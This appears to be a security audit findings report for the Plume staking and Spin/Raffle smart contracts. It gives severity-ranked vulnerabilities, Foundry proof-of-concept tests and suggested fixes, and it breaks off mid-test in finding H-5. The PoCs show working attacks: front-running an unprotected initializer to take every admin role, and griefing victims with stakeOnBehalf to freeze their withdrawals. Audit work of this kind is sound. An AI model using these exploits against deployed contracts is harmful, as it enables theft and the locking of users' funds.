# contracts/plume - Findings Report
## Commit hash: fe67a98fa4344520c5ff2ac9293f5d9601963983

## Protocol Overview 

### Plume Protocol Overview
Plume is a modular, upgrade-ready ecosystem combining a delegated Proof-of-Stake network with gamified Spin & Raffle mechanics.

#### Core Components
1. **PlumeStaking Diamond**  
   * EIP-2535 proxy holding five facets: AccessControl, Staking, Rewards, Validator, Management.  
   * Users stake PLUME to validators; each validator enforces capacity, commission and status flags.  
   * Checkpointed reward-rate & commission histories let the contract calculate rewards on-demand with O(log n) binary searches, ensuring precision across rate or commission changes.  
   * Unstaking starts a cooldown; withdrawals occur after `cooldownInterval`.  
   * Slashing needs unanimous votes from the other active validators; a treasury-safe burn zeros stake & cooling balances.
2. **PlumeStakingRewardTreasury**  
   * UUPS proxy that custodians ERC20 reward tokens.  
   * Only the Diamond can instruct token transfers when users claim or validators withdraw commission.
3. **Plume ERC20**  
   * Governance token, upgradeable, with mint/burn/pause roles.
4. **Spin & Raffle**  
   * Daily spin game (with Supra-oracle RNG) sells spins, awards PLUME, raffle tickets, or jackpots gated by streaks.  
   * Tickets feed a multi-winner raffle contract that selects winners via the same RNG flow.

#### Security & Governance
OpenZeppelin AccessControl restricts admin, upgrader, validator, reward-manager, and timelock operations. Storage libraries isolate data; upgrade scripts manage facet evolution.

Together, Plume delivers scalable staking economics, flexible rewards, and engaging user incentives—while remaining fully upgradeable.
## Critical Risk Findings
[C-1]. Upgradeability Initializer Safety issue in AccessControlFacet::initializeAccessControl - DONE
## High Risk Findings
[H-1]. Integer Overflow issue in StakingFacet::NA - NOT LEGIT & OUT OF SCOPE
[H-2]. Access Control issue in AccessControlFacet::renounceRole - OUT OF SCOPE
[H-3]. DOS issue in StakingFacet::stakeOnBehalf - OUT OF SCOPE
[H-4]. DOS issue in StakingFacet::withdraw - OUT OF SCOPE
[H-5]. DOS issue in ValidatorFacet::_countActiveValidators - OUT OF SCOPE
[H-6]. Upgradeability Initializer Safety issue in Raffle::NA - DONE PREVIOUSLY
[H-7]. DOS issue in StakingFacet::_processMaturedCooldowns - DONE
[H-8]. DOS issue in RewardsFacet::claim
[H-9]. DOS issue in RewardsFacet::setRewardRates
## Medium Risk Findings
[M-1]. DOS issue in ManagementFacet::setMaxAllowedValidatorCommission
[M-2]. DOS issue in Spin::startSpin
[M-3]. Frontrun/Backrun/Sandwhich MEV issue in Spin::handleRandomness
[M-4]. DOS issue in ValidatorFacet::_cleanupExpiredVotes
[M-5]. Oracle issue in Spin::handleRandomness
[M-6]. DOS issue in Spin::_safeTransferPlume
[M-7]. DOS issue in RewardsFacet::_processAllValidatorRewards
[M-8]. DOS issue in ValidatorFacet::voteToSlashValidator
[M-9]. DOS issue in RewardsFacet::addRewardToken
[M-10]. Frontrun/Backrun/Sandwhich MEV issue in ValidatorFacet::setValidatorCommission
[M-11]. Flash Loan Economic Manipulation issue in StakingFacet::_validateValidatorPercentage
[M-12]. Integer Overflow issue in ManagementFacet::adminClearValidatorRecord
## Low Risk Findings
[L-1]. Integer Overflow/Math issue in RewardsFacet::_finalizeRewardClaim
[L-2]. DOS issue in Raffle::removePrize
[L-3]. Timestamp Dependent Logic issue in Spin::determineReward
[L-4]. DOS issue in RewardsFacet::getPendingRewardForValidator
[L-5]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake
[L-6]. Integer Overflow issue in Spin::determineReward
[L-7]. Upgradeability Initializer Safety issue in Spin::initialize
[L-8]. DOS issue in PlumeStakingRewardTreasury::getRewardTokens
[L-9]. Unexpected Eth issue in PlumeStakingRewardTreasury::NA
[L-10]. DOS issue in RewardsFacet::claimAll
## Info Risk Findings
[I-1]. Unexpected Eth issue in StakingFacet::restakeRewards


### Number of Findings
- C: 1
- H: 9
- M: 12
- L: 10
- I: 1



# Critical Risk Findings

## [C-1]. Upgradeability Initializer Safety issue in AccessControlFacet::initializeAccessControl

## Description
The `initializeAccessControl()` function, which sets up all critical administrative roles for the protocol, is `external` and lacks any access control. It assigns `DEFAULT_ADMIN_ROLE`, `ADMIN_ROLE`, `UPGRADER_ROLE`, and `REWARD_MANAGER_ROLE` to `msg.sender`. Because this function can be called by anyone, an attacker can front-run the legitimate deployer's initialization call. By monitoring the mempool for the transaction that adds the `AccessControlFacet` to the diamond, an attacker can submit their own call to `initializeAccessControl()` with a higher gas fee, effectively hijacking the entire protocol's administration before it is even set up.

## Impact
A successful exploit results in a complete and permanent takeover of the protocol's administrative controls. The attacker gains the ability to manage all roles, upgrade any facet to a malicious implementation, change critical system parameters, and potentially steal all user and protocol funds by granting themselves roles that have withdrawal privileges (e.g., `TIMELOCK_ROLE` which can call `adminWithdraw`). This is a critical vulnerability that compromises the integrity and security of the entire system.

## Proof of Concept
1. The legitimate deployer deploys the main Diamond proxy contract.
2. The deployer then submits a transaction to add the `AccessControlFacet` to the diamond via `diamondCut`.
3. An attacker, monitoring the mempool, sees the `diamondCut` transaction that adds the facet.
4. The attacker immediately crafts and sends a transaction to call `initializeAccessControl()` on the Diamond's address. They use a higher gas price to ensure their transaction is mined before the deployer's legitimate initialization call.
5. The attacker's transaction is mined first. `msg.sender` (the attacker) is granted all top-level administrative roles.
6. When the deployer's legitimate call to `initializeAccessControl()` is eventually processed, it reverts because the `accessControlFacetInitialized` flag has already been set to true by the attacker.
7. The attacker now has full control over the protocol.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import { IDiamondCut } from "@solidstate/contracts/proxy/diamond/IDiamondCut.sol";
import { LibDiamond } from "@solidstate/contracts/proxy/diamond/LibDiamond.sol";

// Import contracts from the project
import { AccessControlFacet } from "src/facets/AccessControlFacet.sol";
import { IAccessControl } from "src/interfaces/IAccessControl.sol";
import { PlumeStakingStorage } from "src/lib/PlumeStakingStorage.sol";
import { PlumeRoles } from "src/lib/PlumeRoles.sol";

// A minimal Diamond proxy for testing purposes that sets an owner.
contract TestDiamond is IDiamondCut {
    constructor(address owner, address facet, bytes4[] memory selectors) {
        LibDiamond.DiamondStorage storage ds = LibDiamond.diamondStorage();
        ds.contractOwner = owner;

        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](1);
        cuts[0] = IDiamondCut.FacetCut({
            facetAddress: facet,
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: selectors
        });
        
        LibDiamond.diamondCut(cuts, address(0), "");
    }

    fallback() external payable {
        LibDiamond.diamondFallback();
    }
}


contract AccessControlExploitTest is Test {
    address deployer;
    address attacker;
    
    TestDiamond diamond;
    AccessControlFacet accessControlFacet;
    IAccessControl diamondAsACF;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        // 1. Deployer deploys the AccessControlFacet implementation
        vm.prank(deployer);
        accessControlFacet = new AccessControlFacet();

        // 2. Deployer deploys the Diamond and "cuts in" the AccessControlFacet
        // This mimics the deployment process where the facet becomes available.
        bytes4[] memory selectors = new bytes4[](7);
        selectors[0] = IAccessControl.initializeAccessControl.selector;
        selectors[1] = IAccessControl.hasRole.selector;
        selectors[2] = IAccessControl.getRoleAdmin.selector;
        selectors[3] = IAccessControl.grantRole.selector;
        selectors[4] = IAccessControl.revokeRole.selector;
        selectors[5] = IAccessControl.renounceRole.selector;
        selectors[6] = IAccessControl.setRoleAdmin.selector;
        
        vm.prank(deployer);
        diamond = new TestDiamond(deployer, address(accessControlFacet), selectors);
        
        diamondAsACF = IAccessControl(address(diamond));
    }

    function test_poc_FrontrunInitializer() public {
        // 3. Attacker sees the deployment and front-runs the initialization call
        vm.startPrank(attacker);
        diamondAsACF.initializeAccessControl();
        vm.stopPrank();
        
        // 4. Attacker verifies they have the ADMIN_ROLE
        assertTrue(diamondAsACF.hasRole(PlumeRoles.ADMIN_ROLE, attacker), "Attacker should have ADMIN_ROLE");
        assertFalse(diamondAsACF.hasRole(PlumeRoles.ADMIN_ROLE, deployer), "Deployer should NOT have ADMIN_ROLE");

        // 5. Deployer's legitimate initialization call now fails
        vm.prank(deployer);
        vm.expectRevert("ACF: init");
        diamondAsACF.initializeAccessControl();

        // 6. Attacker demonstrates control by granting a role to the deployer
        assertFalse(diamondAsACF.hasRole(PlumeRoles.TIMELOCK_ROLE, deployer), "Deployer should not have TIMELOCK_ROLE initially");

        vm.startPrank(attacker);
        diamondAsACF.grantRole(PlumeRoles.TIMELOCK_ROLE, deployer);
        vm.stopPrank();

        assertTrue(diamondAsACF.hasRole(PlumeRoles.TIMELOCK_ROLE, deployer), "Attacker should be able to grant roles");
    }
}
```

## Suggested Mitigation
The `initializeAccessControl` function must be protected to ensure it can only be called by a trusted address, such as the contract deployer or owner. 

One common approach is to have a primary initialization function in the main contract logic (e.g., in `PlumeStaking.sol` or a dedicated initializer facet) that is access-controlled, and this function then calls the logic from `AccessControlFacet` internally.

A more direct fix is to add an access control modifier to the `initializeAccessControl` function itself. Since this is a SolidState diamond, the owner is stored in the diamond's storage slot. The function should check that `msg.sender` is the diamond's owner.

```solidity
// src/facets/AccessControlFacet.sol

import { LibDiamond } from "@solidstate/contracts/proxy/diamond/LibDiamond.sol";

// ... contract definition

    function initializeAccessControl() external {
        // Add this owner check at the beginning of the function
        require(msg.sender == LibDiamond.diamondStorage().contractOwner, "ACF: unauthorized");

        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        require(!$.accessControlFacetInitialized, "ACF: init");

        // Grant the essential DEFAULT_ADMIN_ROLE to the caller (now the owner)
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);

        // Grant ADMIN_ROLE to the caller
        _grantRole(ADMIN_ROLE, msg.sender);

        // ... rest of the function
    }
```
This ensures that only the address that deployed the diamond can initialize the access control, preventing the front-running attack.



# High Risk Findings

## [H-1]. Integer Overflow issue in StakingFacet::NA

## Description
The reward calculation logic in the associated `PlumeRewardLogic` library, which `StakingFacet` relies on, is vulnerable to an integer overflow that can cause a Denial of Service. The function `updateRewardPerTokenForValidator` calculates `rewardPerTokenIncrease = timeDelta * effectiveRewardRate`. The `timeDelta` represents the time elapsed since the last reward update for a specific validator. If a validator has no state-changing interactions for a prolonged period, `timeDelta` can grow very large. If the `effectiveRewardRate` is also high (even if within the admin-set limits), their product can exceed `uint256.max`. Because the contract is compiled with Solidity >=0.8.0, this overflow causes a revert. This blocks any function triggering a reward update for that validator (like `stake`, `unstake`, `claim`), rendering that validator's staking pool unusable.

## Impact
Any validator can be put into a permanently unusable state: every future stake / unstake / claim touching that validator will revert, leaving all already-staked funds stuck until the protocol is upgraded or the storage is patched off-chain.

## Proof of Concept
1. Admin sets an extremely large reward rate for a validator (e.g. rate = type(uint256).max / 10 days).
2. Validator receives at least 1 wei of stake so `totalStaked > 0`.
3. No interaction happens for >10 days so `timeDelta` grows past 10 days.
4. First user that now calls any function that ends up executing `PlumeRewardLogic.updateRewardPerTokenForValidator` causes `timeDelta * effectiveRewardRate` to overflow.
5. Solidity 0.8.x checked-arithmetic reverts, so the outer call (stake/unstake/claim) reverts as well.
6. All subsequent interactions that reference this validator hit the same revert, freezing all user funds delegated to it.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeRewardLogic} from "src/lib/PlumeRewardLogic.sol";
import {PlumeStakingStorage} from "src/lib/PlumeStakingStorage.sol";

// Minimal harness that works completely in-memory, no diamond needed
contract RewardOverflowTest is Test {
    using PlumeRewardLogic for PlumeStakingStorage.Layout;

    PlumeStakingStorage.Layout internal $;
    address internal token = address(0xBEEF);
    uint16  internal validatorId = 1;

    function setUp() public {
        // point $ to the library storage slot used by production code
        $ = PlumeStakingStorage.layout();

        // make validator exist and active with some stake so guard clauses pass
        $.validatorExists[validatorId] = true;
        $.validators[validatorId].active = true;
        $.validatorTotalStaked[validatorId] = 1;

        // create a single reward-rate checkpoint with a huge rate
        uint256 highRate = type(uint256).max / (10 days);
        $.validatorRewardRateCheckpoints[validatorId][token]
            .push(PlumeRewardLogic.RateCheckpoint(block.timestamp, highRate, 0));

        // initialise last update time to now so timeDelta starts at zero
        $.validatorLastUpdateTimes[validatorId][token] = block.timestamp;
    }

    function testOverflowReverts() public {
        // fast-forward long enough so multiplication will overflow
        vm.warp(block.timestamp + 11 days);

        vm.expectRevert();
        $.updateRewardPerTokenForValidator(token, validatorId);
    }
}

## Suggested Mitigation
Replace `rewardPerTokenIncrease = timeDelta * effectiveRewardRate;` with a 512-bit safe multiplication routine such as `FullMath.mulDiv(timeDelta, effectiveRewardRate, 1)` or, alternatively, cap `effectiveRewardRate` so that `timeDelta * effectiveRewardRate <= type(uint256).max` for the maximum possible `timeDelta` (e.g. 365 days).

## [H-2]. Access Control issue in AccessControlFacet::renounceRole

## Description
The `AccessControlFacet.renounceRole` function allows an account to give up a role they possess. The system is configured such that `ADMIN_ROLE` is its own admin, meaning only holders of `ADMIN_ROLE` can grant or revoke it. A critical vulnerability exists because there is no safeguard to prevent the last account with `ADMIN_ROLE` from renouncing it. If the last admin renounces their role, no account will have the permission to grant `ADMIN_ROLE` to anyone else. This leads to a permanent loss of all administrative capabilities, as `ADMIN_ROLE` is the designated admin for all other roles in the system. Consequently, the ability to grant/revoke any role, change role admins, or perform any other administrative action will be lost forever, effectively bricking the governance mechanism of the protocol.

Vulnerable Code Snippet:
```solidity
// contracts/plume/src/facets/AccessControlFacet.sol

function renounceRole(bytes32 role, address account) external override {
    require(account == msg.sender, "AccessControl: can only renounce roles for self");
    _renounceRole(role);
}
```
And the initialization logic that makes `ADMIN_ROLE` self-managed:
```solidity
// contracts/plume/src/facets/AccessControlFacet.sol

function initializeAccessControl() external {
    // ...
    _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
    // ...
}
```

## Impact
Permanent loss of administrative control over the entire system. Once the last admin renounces their role, no new roles can be granted, no roles can be revoked, and no role admins can be changed. This would prevent critical operations such as contract upgrades, emergency pauses, parameter updates, and management of any other role, effectively freezing the protocol's configuration and administration.

## Proof of Concept
1. The protocol is deployed, and the `deployer` calls `initializeAccessControl()`, becoming the sole holder of `ADMIN_ROLE`.
2. The `deployer`, wishing to step down or by mistake, calls `renounceRole(ADMIN_ROLE, deployer_address)`.
3. The transaction succeeds, and the `deployer` no longer has `ADMIN_ROLE`.
4. Since the `deployer` was the only admin, no account in the system now holds `ADMIN_ROLE`.
5. Because `ADMIN_ROLE` is its own admin, no one can grant this role to a new account.
6. Any subsequent attempt to call a privileged function, like `grantRole` for any other role (e.g., `VALIDATOR_ROLE`), will fail because the caller lacks `ADMIN_ROLE`.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {AccessControlFacet} from "contracts/plume/src/facets/AccessControlFacet.sol";
import {PlumeRoles} from "contracts/plume/src/lib/PlumeRoles.sol";

contract RenounceLastAdminBricksTest is Test {
    AccessControlFacet facet;

    bytes32 constant ADMIN_ROLE = PlumeRoles.ADMIN_ROLE;

    address otherUser = address(0xBEEF);

    function setUp() public {
        facet = new AccessControlFacet();
        // caller (this contract) receives DEFAULT_ADMIN_ROLE and ADMIN_ROLE
        facet.initializeAccessControl();
    }

    function testRenounceLastAdmin() public {
        // sanity-check initial role
        assertTrue(facet.hasRole(ADMIN_ROLE, address(this)));

        // renounce – caller is the *only* ADMIN_ROLE holder
        facet.renounceRole(ADMIN_ROLE, address(this));
        assertFalse(facet.hasRole(ADMIN_ROLE, address(this)));

        // any admin-gated call must now revert because no one has ADMIN_ROLE
        vm.expectRevert();
        facet.grantRole(ADMIN_ROLE, otherUser);
    }
}

## Suggested Mitigation
To prevent the permanent loss of administrative control, the `renounceRole` function should be modified to prevent the last member of a critical role (like `ADMIN_ROLE`) from renouncing it. This can be achieved by checking the member count of the role before allowing the renouncement.

First, ensure the underlying `AccessControlInternal` contract provides a way to count role members, similar to OpenZeppelin's `AccessControlEnumerable.getRoleMemberCount`. If it doesn't, this functionality must be added.

Then, update `renounceRole` as follows:

```solidity
// In AccessControlFacet.sol
import { AccessControlEnumerableInternal } from "@solidstate/access/access_control/enumerable/AccessControlEnumerableInternal.sol"; // or equivalent

// ... contract inherits from AccessControlEnumerableInternal ...

function renounceRole(bytes32 role, address account) external override {
    require(account == msg.sender, "AccessControl: can only renounce roles for self");

    // Prevent the last admin from renouncing the role
    if (role == ADMIN_ROLE) {
        require(getRoleMemberCount(role) > 1, "ACF: cannot renounce last admin");
    }

    _renounceRole(role);
}
```
This ensures that there is always at least one administrator, preserving the ability to manage the protocol.

## [H-3]. DOS issue in StakingFacet::stakeOnBehalf

## Description
An attacker can permanently prevent a user from claiming rewards or withdrawing their funds by abusing the `stakeOnBehalf` function. The `StakingFacet._stake` function, which is called by `stakeOnBehalf`, adds the validator to the user's personal list of validators (`userValidators`) if they are staking with them for the first time. This list is stored in `PlumeStakingStorage` and grows each time the user stakes with a new validator. 

Several critical functions, such as `RewardsFacet.claimAll()`, `RewardsFacet.claim(token)`, and `StakingFacet.withdraw()`, iterate over this unbounded array to perform their logic. An attacker can stake a minimal amount on behalf of a victim to a large number of different validators. This inflates the size of the victim's `userValidators` array. When the victim later attempts to call `claimAll()` or `withdraw()`, the transaction will consume an excessive amount of gas while looping through the large array, causing it to hit the block gas limit and revert. This effectively locks the user out of their rewards and staked funds.

Vulnerable code in `StakingFacet._stake` that adds to the unbounded array:

```solidity
// PlumeStakingStorage.sol
function _addUserValidator(Layout storage $, address staker, uint16 validatorId) internal {
    $.userValidators[staker].push(validatorId);
}

// StakingFacet.sol _stake internal function
if (s.userValidatorStake[staker][validatorId] == 0) {
    PlumeStakingStorage._addUserValidator(s, staker, validatorId);
}
```

Functions in `RewardsFacet` and `StakingFacet` that iterate over this unbounded array become denial-of-service vectors for the victim.

## Impact
A malicious actor can grief any user, causing their transactions for claiming rewards (`claimAll`) or withdrawing funds (`withdraw`) to fail due to excessive gas consumption. This leads to a temporary, and potentially permanent, loss of access to user funds and accrued rewards, as the user has no way to shrink the `userValidators` array.

## Proof of Concept
1. The attacker identifies a victim address.
2. The system has a large number of active validators (e.g., 300).
3. The attacker calls `stakeOnBehalf(validatorId, victimAddress)` for each of the 300 validators, staking the minimum required amount each time. This can be done in batches across multiple transactions.
4. This action populates the `$.userValidators[victimAddress]` array with 300 entries.
5. The victim later attempts to call `RewardsFacet.claimAll()` to claim rewards from all their staked validators.
6. The `claimAll` function loops through all reward tokens and then, for each token, calls `_claimFromAllValidators`, which loops through the victim's `userValidators` array (300 entries).
7. The gas cost of this deeply nested loop exceeds the block gas limit, causing the transaction to revert.
8. The victim is now unable to claim any rewards or withdraw their funds through the standard functions.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {PlumeStakingDiamondTest} from "./PlumeStakingDiamond.t.sol";

// NOTE: this test purposefully supplies a limited gas stipend to the call so we
// can deterministically observe an out-of-gas revert when the attacker has
// polluted `userValidators`.  The same gas stipend is enough for a normal user
// (control case) but not for the polluted victim.
contract UserDosGasStipendTest is PlumeStakingDiamondTest {
    address internal attacker = makeAddr("attacker");
    address internal victim   = makeAddr("victim");
    uint16  internal constant NUM_VALIDATORS = 300;

    uint256 internal constant CALL_GAS_LIMIT = 6_000_000; // ~ 6M – succeeds in control case, fails when polluted

    function setUp() public override {
        super.setUp();
        deal(PLUME_NATIVE, attacker, 1_000_000 ether);
        deal(PLUME_NATIVE, victim, 1_000 ether);
    }

    function test_Deterministic_DoS_on_claimAll() public {
        // --------- 1. Deploy validators ---------
        vm.startPrank(VALIDATOR_ADMIN);
        for (uint16 i = 1; i <= NUM_VALIDATORS; i++) {
            _addValidator(i);
        }
        vm.stopPrank();

        // --------- 2. CONTROL USER (no pollution) ---------
        address control = makeAddr("control");
        deal(PLUME_NATIVE, control, 10 ether);
        vm.prank(control);
        staking.stake{value: 10 ether}(1);

        // Fast-forward so some rewards accrue
        vm.warp(block.timestamp + 3 days);

        // Control user should succeed with limited gas
        vm.prank(control, CALL_GAS_LIMIT);
        rewards.claimAll(); // must NOT revert

        // --------- 3. ATTACK: pollute victim with many validators ---------
        vm.startPrank(attacker);
        uint256 minStake = staking.getMinStakeAmount();
        for (uint16 i = 1; i <= NUM_VALIDATORS; i++) {
            staking.stakeOnBehalf{value: minStake}(i, victim);
        }
        vm.stopPrank();

        // Victim does a legitimate stake so they have something to claim
        vm.prank(victim);
        staking.stake{value: 1 ether}(1);

        vm.warp(block.timestamp + 3 days);

        // Victim tries to claim with the SAME gas stipend – should revert OOG
        vm.expectRevert();
        vm.prank(victim, CALL_GAS_LIMIT);
        rewards.claimAll();
    }
}


## Suggested Mitigation
The design should avoid unbounded loops that depend on user-controlled array lengths. Instead of iterating over the entire list of a user's validators, consider paginating the claim and withdraw functions. 

For example, `claim` and `withdraw` functions could accept an offset and a limit to process a subset of the user's validator stakes in a single transaction. This would allow a user to reclaim their funds and rewards over multiple transactions, even if their `userValidators` array has been maliciously inflated.

Example of a paginated claim function:

```solidity
// In RewardsFacet
function claimFromValidators(address token, uint256 startIndex, uint256 limit) external nonReentrant {
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    uint256[] memory validators = s.userValidators[msg.sender];
    uint256 endIndex = startIndex + limit;
    if (endIndex > validators.length) {
        endIndex = validators.length;
    }

    for (uint256 i = startIndex; i < endIndex; i++) {
        _processAndClaimRewards(msg.sender, validators[i], token, s);
    }
}
```
This approach ensures that a user can always retrieve their assets, mitigating the DoS vector.

## [H-4]. DOS issue in StakingFacet::withdraw

## Description
Several core functions in `StakingFacet` iterate over the `userValidators` array, which stores all validators a user has ever staked with. A user can arbitrarily increase the size of this array by staking to many different validators. If this array becomes large enough (e.g., a few hundred validators), the gas cost for executing these loops can exceed the block gas limit, causing transactions to fail permanently. This creates a Denial of Service (DoS) vulnerability that can prevent users from accessing their funds or rewards.

The vulnerable functions are:
1.  `withdraw()`: Calls `_processMaturedCooldowns`, which iterates through all of a user's associated validators to move matured cooldowns to a parked (withdrawable) state.
2.  `restakeRewards()`: Calls `_calculateAndClaimAllRewardsWithCleanup`, which iterates through all of a user's validators to calculate and consolidate rewards before restaking.

A malicious actor could use this to grief the protocol by creating a user account with stakes in numerous validators, although it's more likely that a power user or a script interacting with many validators could accidentally trigger this condition on themselves, leading to a permanent loss of access to their funds.

Vulnerable Code Snippet from `_processMaturedCooldowns` (called by `withdraw`):
```solidity
    function _processMaturedCooldowns(
        address user
    ) internal returns (uint256 amountMovedToParked) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        amountMovedToParked = 0;

        // Make a copy to avoid iteration issues when removeStakerFromValidator is called
        uint16[] memory userAssociatedValidators = $.userValidators[user];

        for (uint256 i = 0; i < userAssociatedValidators.length; i++) { // <<< UNBOUNDED LOOP
            uint16 validatorId = userAssociatedValidators[i];
            PlumeStakingStorage.CooldownEntry memory cooldownEntry = $.userValidatorCooldowns[user][validatorId];

            if (cooldownEntry.amount == 0) {
                continue;
            }

            bool canRecoverFromThisCooldown = _canRecoverFromCooldown(user, validatorId, cooldownEntry);

            if (canRecoverFromThisCooldown) {
                // ... gas-intensive logic inside ...
            }
        }

        if (amountMovedToParked > 0) {
            _updateParkedAmounts(user, amountMovedToParked);
        }

        return amountMovedToParked;
    }
```

## Impact
Users who have staked with a large number of validators can be permanently blocked from withdrawing funds or restaking rewards. The transactions will consistently fail due to running out of gas, resulting in a permanent freeze of the user's assets in the contract.

## Proof of Concept
An attacker (or an unsuspecting power-user) can repeatedly stake the minimum amount in a large number of new validators.  Because `userValidators` is append-only, the array can grow to thousands of entries.  When the user later calls `withdraw()` (or any other function that internally calls `_processMaturedCooldowns` / `_calculateAndClaimAllRewardsWithCleanup`), the contract iterates over the full `userValidators` array:

```
for (uint256 i = 0; i < userAssociatedValidators.length; i++) {
    ...
}
```

Gas consumed by one iteration is ≈ 5.7 k-6 k (multiple SLOAD / SSTORE, several internal library calls).  At ~6 k gas per slot, only ~5 000 validators are required to break the 30 M block-gas limit on main-net L2s:

    5 000  ×  6 000  ≈ 30 000 000 gas  ⟹  tx always reverts with out-of-gas.

Because `userValidators` cannot shrink, the affected user is permanently unable to call `withdraw`, `restakeRewards`, or any function that depends on the same loop, freezing their funds indefinitely.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "forge-std/StdError.sol";

/**
 * @dev Minimal replica of the vulnerable looping pattern found in StakingFacet.
 *      Using this slim contract keeps the test self-contained and compilable.
 */
contract MiniStaking {
    mapping(address => uint16[]) public userValidators;

    function addValidatorForUser(address user, uint16 id) external {
        userValidators[user].push(id);
    }

    // Simulates StakingFacet.withdraw → _processMaturedCooldowns loop
    function withdraw() external {
        uint16[] storage vals = userValidators[msg.sender];
        for (uint256 i; i < vals.length; i++) {
            //   heavy logic in real contract – omitted here
            uint16 _ = vals[i];
            _;
        }
    }
}

contract StakingDoSTest is Test {
    MiniStaking staking;
    address user = address(0xBEEF);

    function setUp() public {
        staking = new MiniStaking();
    }

    function test_outOfGas_when_many_validators() public {
        // Build an oversized userValidators array (6 000 entries).
        for (uint16 i; i < 6000; i++) {
            staking.addValidatorForUser(user, i);
        }

        // Expect the call to run out of gas even with 30M provided
        vm.expectRevert(stdError.outOfGas);
        vm.prank(user);
        staking.withdraw{gas: 30_000_000}();
    }
}

## Suggested Mitigation
The functions that iterate over all of a user's validator associations should be refactored to process items in batches or allow the user to specify which items to process. This shifts the responsibility of managing transaction gas costs to the user and prevents a situation where a transaction becomes impossible to execute.

For `withdraw()`, a new function could be introduced to process matured cooldowns for a specific subset of validators. The user would call this function one or more times to move funds into their 'parked' balance, and then call `withdraw()` to retrieve the total parked amount.

Example Mitigation:
```solidity
// In StakingFacet.sol

/**
 * @notice Processes matured cooldowns for a user-specified list of validators.
 * @param validatorIds An array of validator IDs to process cooldowns for.
 */
function processMaturedCooldownsForValidators(uint16[] calldata validatorIds) external {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    address user = msg.sender;
    uint256 amountMovedToParked = 0;

    for (uint256 i = 0; i < validatorIds.length; i++) {
        uint16 validatorId = validatorIds[i];
        // Ensure the user actually has a cooldown to process to avoid wasted iterations.
        if ($.userValidatorCooldowns[user][validatorId].amount > 0) {
            PlumeStakingStorage.CooldownEntry memory cooldownEntry = $.userValidatorCooldowns[user][validatorId];

            bool canRecoverFromThisCooldown = _canRecoverFromCooldown(user, validatorId, cooldownEntry);

            if (canRecoverFromThisCooldown) {
                uint256 amountInThisCooldown = cooldownEntry.amount;
                amountMovedToParked += amountInThisCooldown;

                _removeCoolingAmounts(user, validatorId, amountInThisCooldown);
                delete $.userValidatorCooldowns[user][validatorId];

                if ($.userValidatorStakes[user][validatorId].staked == 0) {
                    PlumeValidatorLogic.removeStakerFromValidator($, user, validatorId);
                }
            }
        }
    }

    if (amountMovedToParked > 0) {
        _updateParkedAmounts(user, amountMovedToParked);
    }
}

// The original withdraw() function would then be modified to remove the automatic call to _processMaturedCooldowns.
function withdraw() external {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    address user = msg.sender;

    // The user is now responsible for calling processMaturedCooldownsForValidators first.
    // _processMaturedCooldowns(user); // This line is removed.

    uint256 amountToWithdraw = $.stakeInfo[user].parked;
    if (amountToWithdraw == 0) {
        revert InvalidAmount(0);
    }

    _removeParkedAmounts(user, amountToWithdraw);
    _cleanupValidatorRelationships(user);
    emit Withdrawn(user, amountToWithdraw);

    (bool success,) = user.call{ value: amountToWithdraw }("");
    if (!success) {
        revert NativeTransferFailed();
    }
}
```
Similar patterns should be applied to `restakeRewards` and any other functions suffering from the same unbounded loop issue.

## [H-5]. DOS issue in ValidatorFacet::_countActiveValidators

## Description
The slashing mechanism in `ValidatorFacet` can be disabled by a Denial of Service attack due to unbounded loops. Two key functions, `_countActiveValidators` and `_countEligibleValidators`, iterate through the entire `$.validatorList` array to count validators. If the number of validators in the system grows large, the gas cost of these loops can exceed the block gas limit, causing any transaction that calls them to revert.

```solidity
// In PlumeValidatorLogic.sol
function _countActiveValidators(PlumeStakingStorage.Layout storage $) internal view returns (uint256) {
    uint256 count = 0;
    for (uint256 i = 0; i < $.validatorList.length; i++) {
        if ($.validators[$.validatorList[i]].active) {
            count++;
        }
    }
    return count;
}
```

These functions are called within `voteToSlashValidator` and `slashValidator`, which are critical for enforcing penalties against malicious validators. If these functions become unusable, the slashing mechanism is effectively broken, removing a core security component of the protocol.

Additionally, the `_performSlash` function contains `delete $.stakers[validatorId]`, which deletes a dynamically-sized array of staker addresses. If a validator has a very large number of stakers, the gas cost of this deletion can also exceed the block gas limit, making that specific validator unslashable.

## Impact
The slashing mechanism can be rendered permanently inoperable. This eliminates the economic deterrent for validators to act maliciously, as they can no longer be punished on-chain. This severely undermines the security and integrity of the entire staking system.

## Proof of Concept
1. Bootstrap the staking system with 1 target validator (id = 1) and 1 honest voter validator (id = 2).
2. Append 3,000 additional dummy validators so that `validatorList.length = 3,002`.
3. From the honest validator admin, call `voteToSlashValidator(1, expiry)` but send the call with a gas stipend of 150,000 gas.  With ~3,000 iterations inside `_countEligibleValidators`, the loop consumes >150k gas and the EVM runs out of gas, reverting the transaction.
4. Because every participant can force a low-gas context (or the network raises gas-price / block-limit pressure), slashing can be made economically or technically impossible, disabling the security mechanism for all users.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingDiamond} from "../test/PlumeStakingDiamond.t.sol";
import {PlumeStakingStorage} from "contracts/plume/src/lib/PlumeStakingStorage.sol";

contract DosSlashTest is Test, PlumeStakingDiamond {
    function setUp() public {
        // assume PlumeStakingDiamond.t.sol sets up the diamond, facets and roles
    }

